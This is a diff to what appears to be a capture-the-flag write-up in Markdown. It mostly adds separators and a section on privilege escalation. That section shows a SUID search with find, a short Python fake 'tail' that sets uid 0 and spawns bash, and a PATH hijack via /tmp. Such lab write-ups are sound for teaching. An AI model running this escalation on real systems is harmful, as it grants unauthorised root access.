@@ -116,6 +116,8 @@
 
 ![image](https://github.com/user-attachments/assets/88e40da0-f3f5-4371-96ac-0b4674bf27cb)
 
+------------------------------
+
 ### Reading the file with sqlite3 
 
 - I used the `sqlite3` binary to open the db, and `.open <db's name>` to open it
@@ -126,6 +128,7 @@
 
 ![image](https://github.com/user-attachments/assets/b382fda7-3da0-45ad-94cc-1645d67ed2e6)
 
+------------------------------
 
 ### Cracking the admin's hash with crackstation
 
@@ -136,6 +139,8 @@
 - Admin access
 
 ![image](https://github.com/user-attachments/assets/63748d4b-f958-47e7-929e-e9aed80c393b)
+
+---------------------------------
 
 ### XML EXTERNAL ENTITY to file read
 
@@ -187,7 +192,38 @@
 
 ![image](https://github.com/user-attachments/assets/c71fdd23-148b-40ad-9972-d79fa6988efa)
 
+------------------------
+
 ### Privilege Escalation with path hijacking
+
+- I checked for suid binaries with `find  / -type f -perm -u=s 2</dev/null` and got one `home/joe/live_log`
+
+![image](https://github.com/user-attachments/assets/60101168-04c2-4bd2-825a-ee61735d2aec)
+
+- I checked the binary with `strings /home/joe/live_log`. I noticed that the binary runs `tail` without specifying the path. We can hijack the path and force suid binary to run our malicious binary.
+
+![image](https://github.com/user-attachments/assets/05a860e3-bd88-4e98-85f6-b6773200774c)
+
+- Our malicious tail file,don't forget to `chmod +x`,this python will set our uid to 0 and spawn a `bash` shell
+
+      #! /usr/bin/env python3 
+      print("Malicious me")
+      import os
+      os.setuid(0)
+      os.setgid(0)
+      os.system("/bin/bash")
+
+- We will add `/tmp` as a directory for the server to check for binaries before proceeding to `/usr/bin/` with `export PATH=/tmp:$PATH`.
+
+![image](https://github.com/user-attachments/assets/0fb8b7f4-5281-447c-bacf-46d941ca58d7)
+
+- Root
+
+![image](https://github.com/user-attachments/assets/45d93e22-1111-4e80-8e48-2edae2823492)
+
+----------------------
+
+### THANKS FOR READING  
 
 
   
